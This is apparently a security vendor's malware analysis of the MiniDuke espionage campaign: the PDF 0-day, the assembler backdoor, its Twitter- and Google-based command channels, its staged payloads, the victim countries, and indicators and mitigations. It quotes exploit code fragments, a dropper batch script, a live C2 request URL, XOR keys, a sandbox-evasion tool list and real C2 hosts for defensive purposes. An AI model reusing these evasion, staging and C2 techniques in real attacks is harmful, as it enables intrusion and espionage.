The MiniDuke Mystery: PDF 0-day
Government Spy Assembler 0x29A Micro
Backdoor
(or ‘how many cool words can you fit into one title’)
Authors:
Costin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk
Global Research and Analysis Team, Kaspersky Lab
On Feb 12th 2013, FireEye announced the discovery (http://blog.fireeye.com/research/2013/02/the-number-of-thebeast.html) of an Adobe Reader 0-day exploit which is used to drop a previously unknown, advanced piece of malware. We
called this new malware “ItaDuke” because it reminded us of Duqu and because of the ancient Italian comments in the
shellcode copied from Dante Aligheri’s Divine Comedy.
Since the original announcement, we have observed several new incidents using the same exploit (CVE-2013-0640), some of
which were so unusual that we decided to analyze them in depth.
Together with our partner CrySyS Lab, we’ve performed a detailed analysis of these new incidents which indicate a new,
previously unknown threat actor. For their analysis, please read http://blog.crysys.hu/2013/02/miniduke/ . For our analysis,
please read below.
First of all, while the fake “Mandiant” PDF reports (see http://blog.seculert.com/2013/02/spear-phishing-with-mandiant-aptreport.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SeculertResearchLab+(Seculert+Researc
h+Lab)) are just dirty hacks of the original exploit, these newer attacks appear to have been created by a 0-day toolkit that was
used to build the original “Visaform Tukey.pdf” discovered by FireEye.

PAGE 1| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor|

The new PDF attacks drop fake documents that are shown to the victim if the exploit is successfully executed. The documents
refer to a human rights seminar (ASEM) and Ukraine’s foreign policy and NATO membership plans:

Document used against the Hungarian target

PAGE 2| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Document used against the Belgian target

PAGE 3| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Document used against the Luxemburg target
The MD5s for the documents used in this attack are:
3668b018b4bb080d1875aee346e3650a
88292d7181514fda5390292d73da28d4
3f301758aa3d5d123a9ddbad1890853b
0cdf55626e56ffbf1b198beb4f6ed559
cf5a5239ada9b43592757c0d7bf66169
c03bcb0cde62b3f45b4d772ab635e2b0

action_plan.pdf (Country: Belgium)
ASEM_seminar.pdf (Country: Hungary)
EUAG_report.pdf (Country: Luxembourg)
report.pdf (Country: Spain)
EUAG_report.pdf (Country: Belgium)
The 2013 Armenian Economic Association.pdf (Country: Belgium)

The JavaScript exploit code has been modified since the original attack. For instance, the function named “oTHERWISE” was
renamed to “q1w2e3r4t”. The function is later called in the code like this:
New exploit:
var sCIENZA = q1w2e3r4t(vOLENCI[sHOGG('ODNEDNERp',3329,7937)], gIRARSI);
Older (“Visaform Turkey.pdf”) exploit:

PAGE 4| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

var sCIENZA = oTHERWISE (vOLENCI['pRENDENDO'], gIRARSI);
In addition, the JS code is now in compressed format, while the original sample had it in plaintext. The reason behind the
changes is probably to avoid detection by anti-malware products although this doesn’t prevent our product from detecting it
heuristically as “HEUR:Exploit.Script.Generic”.
The shellcode contained in the PDF document is similar to that used in the documents carrying the “Itaduke” payload, with
some differences. For instance, after exploiting the vulnerability, it searches for a specific signature within the PDF file. While
the “Itaduke” shellcode was looking for “!H2bYm.Sw@”, the MiniDuke version uses a different signature, “@34fZ7E*p\”.

Signature in the Itaduke PDF file

Signature in the Miniduke PDF file
Once the payload signature is found, it is decrypted with XOR and then decompressed using RtlDecompressBuffer API (LZNT1).
The resulting PE file is written to a temporary file and loaded using LoadLibary API.
The resulting dynamic library implements the second stage of installation. It contains two binary resources, 101 and 102.
Resource 101 is the main backdoor DLL component. It is written to the %AppData% directory and loaded using LoadLibary API.
Resource 102 is the decoy PDF document. It is written to the Internet cache directory and then opened using a simple BAT file:
TASKKILL /F /IM acro*
ping -n 1 127.0.0.1>nul
start "" "%path to decoy PDF document%"
The filenames of the dropped files are hardcoded in their resources.

Beginning of the resource 101 with its filename

Beginning of the resource 102 with its filename

Interestingly, the malware dropper contains the following paths:

●
●

“c:\src\dlldropper\Release\L2P.pdb”.
“C:\src\hellodll\Release\hellodll.pdb”.

PAGE 5| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

These paths did not exist in the dropper of original PDF (“Visaform Turkey.pdf”).
If we are to trust the PE headers, the dropper was compiled on Feb 20, 2013:

‘Hungarian’ dropper compilation time - “Feb 20 10:51:16 2013”
The backdoor used in the Hungarian case was compiled on “Feb 20 10:57:52 2013”, just minutes after the dropper was
created.
Perhaps the most unusual thing about these three new attacks is the malware they drop. In all the analyzed cases, the
dropped malware is in the form of a 22,528 bytes DLL file. Parts of the malicious DLL file are encrypted with information
related to the system configuration, which ensures it will only work properly on the victim’s system. If copied to another
computer, the malware will be unable to function successfully.

The backdoor is written in “old school” assembler and is tiny by current standards - only 20 KB. This is most unusual for
modern malware, which can be several megabytes in size. It has a small decryptor at the beginning that decrypts the main
body. All three cases use different encryption keys. Another peculiarity is that the backdoor has no imports: all functions are
scanned from memory and are called dynamically. It is also interesting that the first two Win32 APIs resolved and called by the
unpacking stub are ntdll.LdrLoadDll and kernel32.VirtualProtectEx. These two functions are not called according to the
“_stdcall” convention. Instead, a ‘jmp ebx’ instruction is executed after manually building the stack. Clearly some thought went
into creating anti-emulation and anti-scanning techniques with this malware.

Backdoor analysis
The backdoor has a single export, which for instance is named “JorNgoq” in the Hungarian case. When this export is called at
load, the backdoor sets the “.rdata” section’s permissions to “RWX” and sets the mutex to a hardcoded string “nljhfdb”.
The entrypoint of the library (DllMain) is obfuscated and the main body of the malware is encrypted. The encryption is rather
simple: the “.rdata” section of the library is ROL’ed with a linear key and XOR’ed with a fixed key. Both keys are derived from
the length of the encrypted part.

PAGE 6| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Decryption loop in the obfuscated code.
0x4522 is the actual size of the encrypted part
Once finished decrypting, the library proceeds to the real “main” function. The main part of the library is written in Assembler,
in an “old-school” manner typical for low-level viruses. The code is position independent; it has no imports and resolves API
function addresses by hash values of their names.

.
Typical low-level malware programming style:
passing strings as parameters via call, addressing API functions by hash values

The backdoor maintains seven call addresses that each maintain their own block of functionality.
The first block calls GetAsyncKeyState twice, checking for a mouse click, which indicates user activity in the system. The second
block searches for all “*.exe” and “*.dll” files located in the %temp% directory. The third block fetches information about the
infected system with calls to gather information about the CPU, drive and the computername - these are used to decrypt the
backdoor’s main body, which is custom encrypted for each unique victim.

PAGE 7| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

The fourth block attempts to maintain self-protection from malware analysis. Below is the list of tools (and VMware) that it
attempts to identify and protect against. It fetches the list of running processes on the system and attempts to identify if these
tools are among them:
apispy32.exe, apimonitor.exe, winapioverride32.exe, procmon.exe, filemon.exe, regmon.exe, winspy.exe, wireshark.exe,
dumpcap.exe, tcpdump.exe, tcpview.exe, windump.exe, netsniffer.exe, iris.exe, comview.exe, ollydbg.exe, windbg.exe,
odb.exe, ImmunityDebugger.exe, syser.exe, idag.exe, idag64.exe, petools.exe, vboxtray.exe, vboxservice.exe, procexp.exe,
vmtools.exe, vmwaretray.exe, vmwareuser.exe
If any of the tools above are detected on the system, the malware will continue running on the system without further
decrypting its code and exhibiting any other functionality. This will prevent it from doing any outbound communications with
Twitter accounts, as described below. In other words, it will attempt to appear non-functional, especially to automated
analysis, hiding its true nature behind its layers of encryption.
User agent strings for web browsers like Opera, Mozilla and Internet Explorer are decrypted and used for all Internet access.
Oddly, there are Linux versions included as well:
(Windows NT 5.1; (Windows NT 6.0; (Windows; U; Windows NT 5.2; (X11; Linux i686; (X11; Linux x86_64; (compatible; MSIE
6.0; Windows NT 5.0; (compatible; MSIE 7.0; Windows NT 6.0; (compatible; MSIE 9.0; Windows NT 6.1;WOW64) ;Trident/4.0) ;
Trident/5.0) ; WOW64; Trident/5.0) ; SV1) )
The fifth and sixth code blocks are most interesting. They calculate the SHA1 of main system information which will be used in
the C2 interaction later.

Following the SHA-1 hash generation, the backdoor will base64 encode its unique hash for later C2 communication.
The malware is activated upon reboot of the infected machine. To gain control at boot, it writes a randomly named LNK file to
the startup folder, which in turn calls the main body using rundll32:

PAGE 8| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

PAGE 9| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

In the picture above, the malware’s main body is stored as “stat.bin” (a randomly selected name) in the “Adobe” folder. The
LNK file calls it only exported function, “ImqRgno”.
Once activated, the malware will first contact Twitter and look for posts from some very specific accounts. These accounts
should have posted an encrypted string which contains the magic identifier “uri!”, then an encrypted c2 string.

PAGE 10| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

We presume many other Twitter accounts exist with similar parameters.
The encrypted “uri!” holds a different c2 for each version of the malware:
Attack location

Command & control
server

C2 IP / location

path on C2

PAGE 11| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Hungary

arabooks[dot]ch

194.38.160.153 /
Switzerland

/lib/index.php

Luxemburg

artas[dot]org

95.128.72.24 / France

/engine/index.php

Belgium

tsoftonline[dot]com

72.34.47.186 / United
States

/views/index.php

(Multiple)

www[dot]eamtm[dot]co
m

188.40.99.143 / Germany

/piwik/web/index.php

It’s most likely that these websites have been hacked by the attackers and injected with the command and control PHP script.
Secondly, the malware will connect to “www.geoiptool.com” to obtain information about the victim’s location.
Interestingly, the backdoor has another update/c2 functionality. It searches Google for a very specific string:

The string “lUFEfiHKljfLKWPR” which the malware seeks on Google
The pages found by the Google search may hold an update “uri” similar to the one from Twitter. We can assume the attackers
wanted to have a second channel for updates in case the Twitter accounts are closed.

PAGE 12| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Stage 2
The “index.php” on the C2 serves a fake GIF file to the victim, depending on the parameters it receives. Here’s what one of
these GIF files looks like:

Here’s one example of a malicious request for the C2 domain “arabooks*dot+ch”:
arabooks.ch/lib/index.php?ia=TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp[REMOVED]lhUDx
vzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw==
The picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data,
known as ‘steganography’:

At offset 0x6a4 inside the GIF file, there is a hidden encrypted PE file. The encryption scheme used a DWORD key also stored in
the GIF file that is rotated. Effectively, this translates to an 8 byte long XOR key. The resulting encryption key used in the
Hungarian attack for instance is {0xD2, 0x2A, 0xA2, 0x27, 0x79, 0x95, 0x52, 0x2D}. In the Belgian attack, it is {0xC5, 0x5E, 0xEE,
0xE5, 0x51, 0x11, 0x17, 0x7C}. For the Luxemburg attack, the key is {0x91, 0x18, 0x8C, 0xC1, 0x1C, 0xC9, 0x9C, 0xC9}.

PAGE 13| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Decrypted payload from the fake GIF file served by the C2
The decrypted PE file (plugin / payload) is also written in assembler and, once again, it is encrypted with the same algorithm as
the backdoor originally deployed in the system. We refer to it as “stage 2”. The main backdoor body saves the plugin with
different names, for instance, it can be “xml.dat” and tries to run its only export using rundll. In our case, this didn’t appear to
work very well:

PAGE 14| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Several different variants of the 2nd stage backdoors have been observed on the C2; they all perform similar functions but are
encrypted with different keys and contact different C2s.

Command & control server information
The malware connects to several C2s depending on the information available on the control Twitter accounts or on Google.
For instance, on “artas*dot+org” it connects to “/engine/index.php”. Interestingly, the “img” subfolder allows listings and we
can see several variants of the backdoor encrypted as GIF files:

PAGE 15| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

On “tsoftonline*dot+com”, the folder has the same structure:

Interestingly, on “tsoftonline*dot+com” we have several other files with different kind of names and sizes. They are larger and
follow a different naming scheme: “*number+.gif”. We believe they are custom backdoors delivered only to specific victims by
the attackers. We refer to these as “stage 3”.

PAGE 16| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Stage 3
While we were analyzing the samples, the attackers connected to the C2 and added a custom backdoor as “1109821546.gif”:
"http://tsoftonline.com/views/img/1109821546.gif"
HTTP/1.1 200 OK
Date: Mon, 25 Feb 2013 12:34:13 GMT
Server: Apache
Last-Modified: Mon, 25 Feb 2013 10:59:49 GMT
ETag: "7c8251-5190d-4d68a708d9340"
Accept-Ranges: bytes
Content-Length: 334093
Content-Type: image/gif
This custom backdoor, referred to as “stage 3”, is much bigger than the previous ones – 300K+ in size. This is because the
attackers used large layers of obfuscation code, including UCL compression. So far, we have observed two variants of the 300K
“stage 3” backdoor. The PE compilation timestamp for both is “Mon Jun 18 17:28:11 2012”. The number “1109821546” in the
filename refers to the unique victim ID. In this case, we were able to determine that the victim is based in Portugal.
The backdoor connects to the following C2 for instructions:
news[dot]grouptumbler[dot]com/news/feed.php
IP: 200.63.46.23
It supports several commands, such as copy file, move file, remove file, make directory, kill process and of course, download
and execute new malware.
The server at 200.63.46.23 is hosted in Panama:

PAGE 17| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

We presume that it was hacked by the attackers and is currently used as a command server for the attacks.
MD5 hashes for the known “Stage 3” backdoors:
1e1b0d16a16cf5c7f3a7c053ce78f515
53db085a276ebbf5798ba756cac833ea

v1.ex_
v2.ex_

In addition to the ~300K “stage 3” backdoors, we’ve observed a 13K module (MD5:
6bc34809e44c40b61dd29e0a387ee682).This module will connect to an IP in Turkey, get the response, decrypt it in memory
and execute it. The C2 is:
85.95.236.114

The module has a compilation timestamp of “Tue Nov 13 14:30:12 2012”.

Map of victims
The C2s maintain a detailed, encoded log of the victims connecting to the servers. The logs are available to anyone who knows
the exact filename. By collecting the logs from all the known command servers, we’ve discovered connections from several
high profile networks belonging to:

Country

Network

Ukraine

Government, Private company

Belgium

Possible Embassy / Government

Portugal

Government

Romania

Government

PAGE 18| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

Czech Republic

Government

Ireland

Government

United States

Think tank(s), Research institute, Healthcare provider

Hungary

Social foundation

By analyzing the logs from the command servers, we have observed 59 unique victims in 23 countries:
Belgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania,
Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States.
The amount of high profile victims in this attack is notable and puts it on the same level with other advanced campaigns such
as “Red October”.

Mitigation and recommendations
To protect against these attacks, we recommend that you:

●
●
●
●

●

●
●

Update Java to the latest version or simply remove it from the system if not used
Update Microsoft Windows and Office to the latest versions
Update Adobe Reader to the latest version (see https://www.adobe.com/support/security/bulletins/apsb13-07.html)
Block traffic to the following domains:
○ arabooks.ch
○ artas.org
○ tsoftonline.com
○ www.eamtm.com
○ news.grouptumbler.com
Block traffic to the following IPs:
○ 200.63.46.23
○ 194.38.160.153
○ 95.128.72.24
○ 72.34.47.186
○ 188.40.99.143
○ 85.95.236.114
Install a security solution capable of detecting these threats such as Kaspersky Internet Security 2013 and scan all
emails and received documents
Be wary of opening suspicious documents on your systems; instead, use another computer without an Internet
connection, a VM, or upload the document to Google Docs for viewing

In addition, infected PDFs contain the following string, which can be used as a quick way to find them: “@34fZ7E*p\”

Conclusions
Based on our experience, this is a unique and very strange attack. The many different targets hit in separate countries,
together with the high profile appearance of the decoy documents and the weird backdoor functionality indicate an unusual
threat actor. Some of the elements remind us of both Duqu and Red October, such as the minimalistic approach, hacked
servers, encrypted channels but also the typology of the victims.

PAGE 19| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |

The backdoor coding style reminds us of a malware writing group which is believed to be extinct: 29A. The value 29A in hex
means 666, and perhaps not unsurprisingly, was also left by the attackers as a clue in the code:

The 29A / 666 clue left in the code by the attackers

29A published their first malware magazine in December 1996 and were active until February 2008, when ‘Virusbuster’, the
last standing man announced the group’s dismissal.
The logs from the Command & Control servers indicate determination and quite a bit of success in compromising several high
profile entities in various countries. The stage 3 compilation timestamps indicate the attacker has been active for quite a
while but still managing to remain undetected.
Perhaps one of the most important questions is: are these attacks related to the “Itaduke” attack that prompted the discovery
of the PDF 0-day? Or is it a separate entity that purchased the attack kit from the same source, which has a different agenda?
Or, is it perhaps another threat actor which captured the 0-day exploit and modified it for other purposes? Unfortunately,
there are still many unanswered questions.

Note: We detect the malware described here as HEUR:Backdoor.Win32.MiniDuke.gen, Backdoor.Win32.Miniduke while the
documents with exploits are detected as Exploit.JS.Pdfka.giy.

References:
●
●

“In Turn it’s PDF Time”
http://blog.fireeye.com/research/2013/02/in-turn-its-pdf-time.html
“Duqu: Steal everything”
http://www.kaspersky.com/about/press/duqu

PAGE 20| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |